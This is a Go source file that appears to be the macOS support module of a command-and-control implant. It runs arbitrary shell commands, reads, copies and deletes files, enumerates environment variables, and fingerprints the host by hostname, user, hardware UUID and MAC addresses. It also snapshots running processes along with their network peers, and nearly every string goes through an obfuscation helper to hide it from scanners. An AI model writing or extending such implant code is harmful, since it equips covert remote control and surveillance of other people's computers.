package macapi

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	"golang.org/x/sys/unix"

	"stageless/utils/obf"
)

const tasksBufferMax = uint64(32) * 1024 * 1024

type DirEntry struct {
	Name  string
	IsDir bool
}

type ProcessStat struct {
	PID     int
	PPID    int
	Session int
	Comm    string
}

type ProcessStatus struct {
	Name    string
	UID     int
	VMRSSKb int64
}

var prevDir string

// ======================
// time / sleep
// ======================

func GetCurrentProcessID() uint64 {
	// Returns the current process id
	pid := uint64(os.Getpid())
	return pid
}

func GetTickCount() uint64 {
	// Reads the monotonic clock and returns milliseconds
	var ts unix.Timespec
	if err := unix.ClockGettime(unix.CLOCK_MONOTONIC, &ts); err != nil {
		return 0
	}
	ms := uint64(ts.Sec)*1000 + uint64(ts.Nsec)/1_000_000
	return ms
}

func SleepMs(ms uint64) {
	// Sleeps for the given number of milliseconds
	if ms == 0 {
		return
	}
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

// ======================
// process exec
// ======================

func ExecPosix(cmd, args string) []byte {
	// Runs a shell command and returns the combined output
	script := cmd
	if args != "" {
		script += " " + args
	}
	out, _ := exec.Command("/bin/sh", "-c", script).CombinedOutput()
	return out
}

// ======================
// file io
// ======================

func PathExists(path string) bool {
	// Checks that the path exists
	_, err := os.Stat(path)
	return err == nil
}

func PathIsDir(path string) bool {
	// Checks that the path is a directory
	st, err := os.Stat(path)
	return err == nil && st.IsDir()
}

func GetCurrentDir() string {
	// Returns the current working directory
	wd, err := os.Getwd()
	if err != nil {
		return ""
	}
	return wd
}

func SetCurrentDir(path string) bool {
	// Changes the current working directory
	err := os.Chdir(path)
	return err == nil
}

func MakeDir(path string) bool {
	// Creates a directory at the given path
	return os.Mkdir(path, 0o755) == nil
}

func RemoveDirPath(path string) bool {
	// Removes a directory path
	return os.Remove(path) == nil
}

func DeletePath(path string) bool {
	// Deletes the path
	return os.Remove(path) == nil
}

func MovePath(src, dst string) bool {
	// Moves a path from source to destination
	return os.Rename(src, dst) == nil
}

func CopyPath(src, dst string) bool {
	// Copies a file from source to destination
	in, err := os.Open(src)
	if err != nil {
		return false
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return false
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err == nil
}

func JoinPath(base, name string) string {
	// Joins a base path and a name
	if base == "" {
		return name
	}
	if base == PathSep {
		return PathSep + name
	}
	if strings.HasSuffix(base, "/") {
		return base + name
	}
	return base + PathSep + name
}

func ListDirEntries(dir string) []DirEntry {
	// Reads a directory and returns its entries
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var out []DirEntry
	for _, ent := range entries {
		name := ent.Name()
		full := JoinPath(dir, name)
		isDir := false
		if st, err := os.Stat(full); err == nil {
			isDir = st.IsDir()
		} else {
			isDir = ent.IsDir()
		}
		out = append(out, DirEntry{Name: name, IsDir: isDir})
	}
	sort.Slice(out, func(i, j int) bool {
		// Compares two entry names for sorting
		return out[i].Name < out[j].Name
	})
	return out
}

func CountDirEntries(path string) int {
	// Counts the entries inside a directory
	if !PathIsDir(path) {
		return 0
	}
	return len(ListDirEntries(path))
}

func GetPathSize(path string) int64 {
	// Returns the size of a path
	st, err := os.Stat(path)
	if err != nil {
		return -1
	}
	return st.Size()
}

func GetPathModeStr(path string) string {
	// Returns the permission mode of a path
	st, err := os.Stat(path)
	if err != nil {
		return ""
	}
	return fmt.Sprintf("0%o", st.Mode().Perm())
}

func FormatPathDate(path string) string {
	// Formats the modification date of a path
	st, err := os.Stat(path)
	if err != nil {
		return obf.S("unknown")
	}
	return st.ModTime().Format("2006-01-02")
}

func FormatPathMtime(path string) string {
	// Formats the modification time of a path
	st, err := os.Stat(path)
	if err != nil {
		return obf.S("-")
	}
	return st.ModTime().Format("2006-01-02 15:04:05")
}

func ReadFileBytes(path string) (ok bool, data []byte, errMsg string) {
	// Reads a file into bytes with size checks
	st, err := os.Stat(path)
	if err != nil {
		return false, nil, IOErrorMessage(err)
	}
	if st.IsDir() {
		return false, nil, obf.S("Path is a directory")
	}
	const fileMaxSize = uint64(25 * 1024 * 1024)
	if uint64(st.Size()) > fileMaxSize {
		return false, nil, obf.S("File exceeds the 25 MB limit")
	}
	if uint64(st.Size()) > (tasksBufferMax-4096)*3/4 {
		return false, nil, obf.S("Output too large")
	}
	data, err = os.ReadFile(path)
	if err != nil {
		return false, nil, IOErrorMessage(err)
	}
	return true, data, ""
}

func ReadPathToBuf(path string, max int) []byte {
	// Reads a path into a buffer up to a max length
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	if len(data) > max {
		data = data[:max]
	}
	return data
}

func ParentPath(path string) string {
	// Returns the parent path of a path
	p := strings.TrimRight(path, "/")
	if p == "" {
		return ""
	}
	i := strings.LastIndex(p, "/")
	if i <= 0 {
		return ""
	}
	return p[:i]
}

func PrevDir() string {
	// Returns the previous directory
	return prevDir
}
func SetPrevDir(p string) {
	// Stores the previous directory
	prevDir = p
}
func BaseName(path string) string {
	// Returns the base name of a path
	return filepath.Base(path)
}

func TempFile(prefix string) (string, func(), error) {
	// Creates a temporary file and returns a cleanup function
	f, err := os.CreateTemp("", prefix)
	if err != nil {
		return "", nil, err
	}
	path := f.Name()
	_ = f.Close()
	return path, func() {
		// Removes the temporary file
		_ = os.Remove(path)
	}, nil
}

func IOErrorMessage(err error) string {
	// Returns a message for an io error
	if err == nil {
		return ""
	}
	if os.IsNotExist(err) {
		return obf.S("File does not exist")
	}
	if os.IsPermission(err) {
		return obf.S("Access denied")
	}
	return obf.S("Cannot read file")
}

// ======================
// env
// ======================

func EnvGetValue(key string) string {
	// Returns the value of an environment variable
	return os.Getenv(key)
}

func EnvEnumerate() [][2]string {
	// Lists environment variables as key and value pairs
	var out [][2]string
	for _, kv := range os.Environ() {
		parts := strings.SplitN(kv, "=", 2)
		if len(parts) == 2 {
			out = append(out, [2]string{parts[0], parts[1]})
		}
	}
	return out
}

// ======================
// fingerprint
// ======================

func ReadHostname() string {
	// Reads the hostname
	name, err := os.Hostname()
	if err != nil {
		return ""
	}
	out := strings.TrimSpace(name)
	return out
}

func GetCurrentUser() string {
	// Returns the current user name
	u, err := user.Current()
	if err != nil {
		return ""
	}
	return u.Username
}

func sysctlString(name string) string {
	// Reads a sysctl value as a string
	v, err := unix.Sysctl(name)
	if err != nil {
		return ""
	}
	out := strings.TrimSpace(v)
	return out
}

func GetOsName() string {
	// Returns the operating system name
	version := sysctlString("kern.osproductversion")
	if version != "" {
		out := obf.S("macOS ") + version
		return out
	}
	return obf.S("macOS")
}

func GetMachineArch() string {
	// Returns the machine architecture
	machine := sysctlString("hw.machine")
	var out string
	switch machine {
	case ArchX64:
		out = obf.S("x64")
	case ArchArm64:
		out = obf.S("arm64")
	default:
		out = machine
	}
	return out
}

func GetMachineID() string {
	// Returns the machine id
	id := sysctlString("hw.uuid")
	return id
}

func CollectMacAddresses() []string {
	// Collects mac addresses from network interfaces
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}
	var macs []string
	for _, iface := range ifaces {
		if iface.Name == LoopbackName {
			continue
		}
		mac := iface.HardwareAddr.String()
		if mac == "" || strings.ToLower(mac) == NullMac {
			continue
		}
		macs = append(macs, strings.ToLower(mac))
	}
	sort.Strings(macs)
	return macs
}

// ======================
// process
// ======================

func ListProcessIDs() []int {
	// Lists running process ids
	out, err := exec.Command("ps", "-axo", "pid=").Output()
	if err != nil {
		return nil
	}
	var ids []int
	sc := bufio.NewScanner(bytes.NewReader(out))
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		if id, err := strconv.Atoi(line); err == nil && id > 0 {
			ids = append(ids, id)
		}
	}
	return ids
}

func ReadProcessStat(pid int) ProcessStat {
	// Reads process stat fields for a pid
	out, err := exec.Command("ps", "-p", strconv.Itoa(pid), "-o", "pid=,ppid=,comm=").Output()
	if err != nil {
		return ProcessStat{}
	}
	fields := strings.Fields(string(out))
	if len(fields) < 3 {
		return ProcessStat{}
	}
	pidVal, _ := strconv.Atoi(fields[0])
	ppid, _ := strconv.Atoi(fields[1])
	return ProcessStat{PID: pidVal, PPID: ppid, Comm: fields[2]}
}

func ReadProcessStatus(pid int) ProcessStatus {
	// Reads process status fields for a pid
	out, err := exec.Command("ps", "-p", strconv.Itoa(pid), "-o", "user=,rss=,comm=").Output()
	if err != nil {
		return ProcessStatus{}
	}
	fields := strings.Fields(string(out))
	if len(fields) < 2 {
		return ProcessStatus{}
	}
	rss, _ := strconv.ParseInt(fields[1], 10, 64)
	name := ""
	if len(fields) >= 3 {
		name = fields[2]
	}
	return ProcessStatus{Name: name, VMRSSKb: rss}
}

func ReadProcessExePath(pid int) string {
	// Reads the executable path of a process
	out, err := exec.Command("ps", "-p", strconv.Itoa(pid), "-o", "comm=").Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func FormatProcessUser(uid int) string {
	// Formats a process user from a uid
	if uid == 0 {
		return obf.S("root")
	}
	return strconv.Itoa(uid)
}

func FormatProcessPrivilege(uid int) (integrity, privilege string) {
	// Formats integrity and privilege from a uid
	if uid == 0 {
		return obf.S("root"), obf.S("root")
	}
	return obf.S("user"), obf.S("user")
}

func FormatProcessArch() string {
	// Returns the process architecture label
	switch GetMachineArch() {
	case obf.S("x64"), obf.S("arm64"):
		return obf.S("64-bit")
	default:
		return GetMachineArch()
	}
}

func GetTcpPidMap() map[int]string {
	// Builds a map of pid to remote tcp address
	out, err := exec.Command("netstat", "-anv").Output()
	if err != nil {
		return map[int]string{}
	}
	result := map[int]string{}
	sc := bufio.NewScanner(bytes.NewReader(out))
	for sc.Scan() {
		line := sc.Text()
		if !strings.Contains(line, "ESTABLISHED") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 9 {
			continue
		}
		pidPart := fields[len(fields)-1]
		if !strings.Contains(pidPart, "/") {
			continue
		}
		parts := strings.Split(pidPart, "/")
		pid, err := strconv.Atoi(parts[0])
		if err != nil {
			continue
		}
		remote := fields[4]
		if remote != "" && !strings.HasPrefix(remote, "*") {
			result[pid] = remote
		}
	}
	return result
}

func SnapshotProcesses() []map[string]any {
	// Builds a snapshot of running processes
	tcpMap := GetTcpPidMap()
	sysArch := FormatProcessArch()
	var out []map[string]any
	for _, pid := range ListProcessIDs() {
		st := ReadProcessStat(pid)
		if st.PID <= 0 {
			continue
		}
		status := ReadProcessStatus(pid)
		name := status.Name
		if name == "" {
			name = st.Comm
		}
		if name == "" {
			name = obf.S("?")
		}
		integrity, privilege := FormatProcessPrivilege(status.UID)
		network := ""
		if v, ok := tcpMap[pid]; ok {
			network = v
		}
		mem := 0.0
		if status.VMRSSKb > 0 {
			mem = math.Round(float64(status.VMRSSKb)/1024.0*10) / 10
		}
		out = append(out, map[string]any{
			obf.S("pid"):        pid,
			obf.S("ppid"):       st.PPID,
			obf.S("name"):       name,
			obf.S("path"):       ReadProcessExePath(pid),
			obf.S("user"):       FormatProcessUser(status.UID),
			obf.S("integrity"):  integrity,
			obf.S("session"):    st.Session,
			obf.S("arch"):       sysArch,
			obf.S("network"):    network,
			obf.S("privilege"): privilege,
			obf.S("cpu"):        0.0,
			obf.S("memory"):     mem,
		})
	}
	return out
}

func BuildProcessTree(procs []map[string]any) []any {
	// Builds a process tree from process snapshots
	pidIdx := map[int]int{}
	for i, p := range procs {
		pidIdx[int(p[obf.S("pid")].(int))] = i
	}
	childOf := map[int][]int{}
	isChild := make([]bool, len(procs))
	for i, p := range procs {
		pid := int(p[obf.S("pid")].(int))
		ppid := int(p[obf.S("ppid")].(int))
		if ppid != 0 && ppid != pid {
			if _, ok := pidIdx[ppid]; ok {
				childOf[pidIdx[ppid]] = append(childOf[pidIdx[ppid]], i)
				isChild[i] = true
			}
		}
	}
	var toJSON func(int) map[string]any
	toJSON = func(idx int) map[string]any {
		// Builds a json node for one process and its children
		p := procs[idx]
		node := map[string]any{
			obf.S("pid"):       p[obf.S("pid")],
			obf.S("name"):      p[obf.S("name")],
			obf.S("path"):      p[obf.S("path")],
			obf.S("cpu"):       p[obf.S("cpu")],
			obf.S("memory"):    p[obf.S("memory")],
			obf.S("user"):      p[obf.S("user")],
			obf.S("integrity"): p[obf.S("integrity")],
			obf.S("session"):   p[obf.S("session")],
			obf.S("arch"):      p[obf.S("arch")],
			obf.S("network"):   p[obf.S("network")],
			obf.S("privilege"): p[obf.S("privilege")],
		}
		if kids, ok := childOf[idx]; ok && len(kids) > 0 {
			children := make([]any, 0, len(kids))
			for _, c := range kids {
				children = append(children, toJSON(c))
			}
			node[obf.S("children")] = children
		}
		return node
	}
	var tree []any
	for i := range procs {
		if !isChild[i] {
			tree = append(tree, toJSON(i))
		}
	}
	return tree
}

func ProcessTreeJSON() string {
	// Returns the process tree as json
	tree := BuildProcessTree(SnapshotProcesses())
	b, _ := json.Marshal(tree)
	return string(b)
}
